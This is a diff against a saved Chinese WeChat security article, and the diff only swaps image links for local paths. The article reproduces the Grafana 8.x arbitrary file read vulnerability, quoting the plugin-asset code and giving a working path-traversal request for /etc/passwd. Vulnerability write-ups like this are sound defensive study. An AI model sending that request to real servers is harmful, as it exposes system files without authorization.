@@ -41,21 +41,21 @@ schema_version: "1"
 
 > 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/DTkVTtbndaMWL9WGzaI32A)
 
-![](https://mmbiz.qpic.cn/mmbiz_png/zNJ4YhKaok3WXGGiakxKvlOQZLV0DRA0Cibptxv2DC9Sxn5MZ24FrEryKEoqwL0LxgYGYB3HupicCAfYosueeazWA/640?wx_fmt=png)
+![](../../.resource/remote/ec7a4eef6d5371570b1b4fffed32b95c5cc32eb0a6ad73c7c36667ed29f2c253.png)
 
-![](https://mmbiz.qpic.cn/mmbiz_png/Wzg6H7uiaEUuONjaSQqwX0liaZMe7ialQk3tOTL7w9MgXuWJrhs95uprpscHr9JSmJ8H2ZAtmRETBREKhcb50sAicg/640?wx_fmt=png)
+![](../../.resource/remote/ec7a4eef6d5371570b1b4fffed32b95c5cc32eb0a6ad73c7c36667ed29f2c253.png)
 
-![](https://mmbiz.qpic.cn/mmbiz_gif/ibicicIH182el6a9EO2exy5AFj6pyO3xjLjCvXiayia3VzRoBiaPUGUibZianO7NicvwetrANBiaRAal6JYKtLxePgArcScw/640?wx_fmt=gif)
+![](../../.resource/remote/41c66fd059bc411a6ea21ba4f775c8c9bb34acb299ef7a081f2c1b061e360137.gif)
 
-![](https://mmbiz.qpic.cn/mmbiz_png/Z1N0HbVwRiaYV3wjJl8bEXPBWw9okzgfDRibxBvM3Ofb08BhgNtK9icic7u9siclk7vGDSria8xYtt4GF1C0CgpialYJQ/640?wx_fmt=png)
+![](../../.resource/remote/ec7a4eef6d5371570b1b4fffed32b95c5cc32eb0a6ad73c7c36667ed29f2c253.png)
 
-![](https://mmbiz.qpic.cn/mmbiz_png/XQNU4yRQkQFWGKHbJOQg3ue2dEI05MmEguiaXzdichLTxcgma0htf9HVwjchWAgFWnJGpyy9S98e7kfpX4GfTBEQ/640?wx_fmt=png)
+![](../../.resource/remote/ec7a4eef6d5371570b1b4fffed32b95c5cc32eb0a6ad73c7c36667ed29f2c253.png)
 
-**![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el7f0qibYGLgIyO0zpTSeV1I6m1WibjS1ggK9xf8lYM44SK40O6uRLTOAtiaM0xYOqZicJ2oDdiaWFianIjQ/640?wx_fmt=png)**  
+**![](../../.resource/remote/62ec45fc20ac500854a811a22154a8a90a49ed2e322f774d1e88a948bb94d039.png)**  
 
-![](https://mmbiz.qpic.cn/mmbiz_png/64HEibicwoTVPB8smnhdVoc7JbSaYqwqvrUcgmufsMThIEejT2UyKBJha6pdibPxAIGLoTibtmG5CvC73DzZ0ubv1Q/640?wx_fmt=png)
+![](../../.resource/remote/568dd3665af81ce9e9b7a3b31ffbbaebdeb9d34694558d7f23179b5c6ab04285.png)
 
-![](https://mmbiz.qpic.cn/mmbiz_png/4R3RgYzzCgG6fvduwiaD0Uzhd9MCO2xZfIttlKGLlzCNCTnAXk4QJyeBoRuDmSMgIMrBricSrdV6F5tH6OGGj80g/640?wx_fmt=png)
+![](../../.resource/remote/f98e0030950fc0ae653c3808440fabb5c684eb3a46fec4682d7dde26d6b1cf8f.png)
 
 **一****：漏洞描述🐑**
 
@@ -63,9 +63,9 @@ schema_version: "1"
 
 Grafana 存在任意文件读取漏洞，通过默认存在的插件，可构造特殊的请求包读取服务器任意文件
 
-![](https://mmbiz.qpic.cn/mmbiz_png/64HEibicwoTVPB8smnhdVoc7JbSaYqwqvrUcgmufsMThIEejT2UyKBJha6pdibPxAIGLoTibtmG5CvC73DzZ0ubv1Q/640?wx_fmt=png)
+![](../../.resource/remote/568dd3665af81ce9e9b7a3b31ffbbaebdeb9d34694558d7f23179b5c6ab04285.png)
 
-![](https://mmbiz.qpic.cn/mmbiz_png/4R3RgYzzCgG6fvduwiaD0Uzhd9MCO2xZfIttlKGLlzCNCTnAXk4QJyeBoRuDmSMgIMrBricSrdV6F5tH6OGGj80g/640?wx_fmt=png)
+![](../../.resource/remote/f98e0030950fc0ae653c3808440fabb5c684eb3a46fec4682d7dde26d6b1cf8f.png)
 
 二:  漏洞影响🐇
 
@@ -73,9 +73,9 @@ Grafana 存在任意文件读取漏洞，通过默认存在的插件，可构造
 
 Grafana 8.x
 
-![](https://mmbiz.qpic.cn/mmbiz_png/64HEibicwoTVPB8smnhdVoc7JbSaYqwqvrUcgmufsMThIEejT2UyKBJha6pdibPxAIGLoTibtmG5CvC73DzZ0ubv1Q/640?wx_fmt=png)
+![](../../.resource/remote/568dd3665af81ce9e9b7a3b31ffbbaebdeb9d34694558d7f23179b5c6ab04285.png)
 
-![](https://mmbiz.qpic.cn/mmbiz_png/4R3RgYzzCgG6fvduwiaD0Uzhd9MCO2xZfIttlKGLlzCNCTnAXk4QJyeBoRuDmSMgIMrBricSrdV6F5tH6OGGj80g/640?wx_fmt=png)
+![](../../.resource/remote/f98e0030950fc0ae653c3808440fabb5c684eb3a46fec4682d7dde26d6b1cf8f.png)
 
 三:  漏洞复现🐋
 
@@ -83,13 +83,13 @@ Grafana 8.x
 
 登录页面
 
-![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el6Zg92HR6cXR3bQ8CPQ0N66aDTibHtgr8KCoJ97Vh0Dbjm3iakKxndSE7Tfnt9UQzpxIdFeLtqHJBNg/640?wx_fmt=png)
+![](../../.resource/remote/92fc6b42d31892513a3678c16c0c648e73744ea4d97bed2626990c6009d0c867.png)
 
   
 
 根据漏洞找到 api.go 中的请求路径
 
-![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el6Zg92HR6cXR3bQ8CPQ0N66TUGxJDaic61FAV2icU1XAibNicKcemIWQPDlicMgicyRlwhQLkib2KLuMdibXA/640?wx_fmt=png)
+![](../../.resource/remote/1def22cbbd6a073bbeabec4873620f71fe6f6f76b41b1412b58d0b645b0835a1.png)
 
 ```
 r.Get("/public/plugins/:pluginId/*", hs.getPluginAssets)
@@ -99,7 +99,7 @@ r.Get("/public/plugins/:pluginId/*", hs.getPluginAssets)
 
 跟踪对应的 getPluginAssets 方法
 
-![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el6Zg92HR6cXR3bQ8CPQ0N6630kgUibrxChUBjMqgY85Llcn7yJicA7S93rmkGUlpWUMickQbGjx8GTgg/640?wx_fmt=png)
+![](../../.resource/remote/34ffbd0a1d835189faa729ca8c312a99a7fc6f601646d5db9d95a3180a5ff098.png)
 
   
 
@@ -110,7 +110,7 @@ requestedFile := filepath.Clean(web.Params(c.Req)["*"])
 pluginFilePath := filepath.Join(plugin.PluginDir, requestedFile)
 ```
 
-![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el6Zg92HR6cXR3bQ8CPQ0N66mKXglCoWiaTqC1rpsLQZU9aiawDfw6OBUkEQ8nU8zuib1K178yZMGNbvQ/640?wx_fmt=png)
+![](../../.resource/remote/f8a53052b822cf8daa9e95351053a1ec4436646bd63f86b6c749677adc168218.png)
 
   
 
@@ -128,18 +128,18 @@ if !exists {
 
 插件路径 public/app/plugins/panel  
 
-![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el6Zg92HR6cXR3bQ8CPQ0N66hic7t1ytpia7GFuxgKEhsXRC5uyB692Cq3KQ6gLibia1jV6eP7fEjKPhPw/640?wx_fmt=png)
+![](../../.resource/remote/801d514d74df66c9cee5a372df80c027aa434c217ff355471f16c5445d9c5f76.png)
 
 ```
 构造请求
 /public/plugins/welcome/../../../../../../../../../etc/passwd
 ```
 
-![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el6Zg92HR6cXR3bQ8CPQ0N66NT61EQEZobEhmzgticttXIp6gubZ08rGs8083JD6hpVVISnrBGk9IaA/640?wx_fmt=png)
+![](../../.resource/remote/c45fc2fe7d3dc654180515ac9e030e5c26a8ff8c1294067b3c19cbdbff72cd7d.png)
 
-![](https://mmbiz.qpic.cn/mmbiz_png/64HEibicwoTVPB8smnhdVoc7JbSaYqwqvrUcgmufsMThIEejT2UyKBJha6pdibPxAIGLoTibtmG5CvC73DzZ0ubv1Q/640?wx_fmt=png)
+![](../../.resource/remote/568dd3665af81ce9e9b7a3b31ffbbaebdeb9d34694558d7f23179b5c6ab04285.png)
 
-![](https://mmbiz.qpic.cn/mmbiz_png/4R3RgYzzCgG6fvduwiaD0Uzhd9MCO2xZfIttlKGLlzCNCTnAXk4QJyeBoRuDmSMgIMrBricSrdV6F5tH6OGGj80g/640?wx_fmt=png)
+![](../../.resource/remote/f98e0030950fc0ae653c3808440fabb5c684eb3a46fec4682d7dde26d6b1cf8f.png)
 
  四:  关于文库🦉
 
@@ -147,7 +147,7 @@ if !exists {
 
 https://www.yuque.com/peiqiwiki
 
-![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el6a9EO2exy5AFj6pyO3xjLjbpcJlmpuPWPCYWibAOJrnm6f10nhxo5zCqPhkhHcgKeuIkr4D2N4cvQ/640?wx_fmt=png)
+![](../../.resource/remote/2b8b6f772a8013a381bb424f7b6b85eefcc2bfea571ad561b190a4674bdd910d.png)
 
 最后
 --
@@ -164,7 +164,7 @@ https://www.yuque.com/peiqiwiki
 
 **知识星球里会持续发布一些漏洞公开信息和技术文章~**
 
-![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el7iafXcY0OcGbVuXIcjiaBXZuHPQeSEAhRof2olkAM9ZghicpNv0p8rRbtNCZJL4t82g15Va8iahlCWeg/640?wx_fmt=png)
+![](../../.resource/remote/ccb7bc5ce7b30b8f99bdeba963cbbbc47267f787b2b78c5fe58adfbaa5f5a97c.png)
 
 **由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，文章作者不为此承担任何责任。**
 
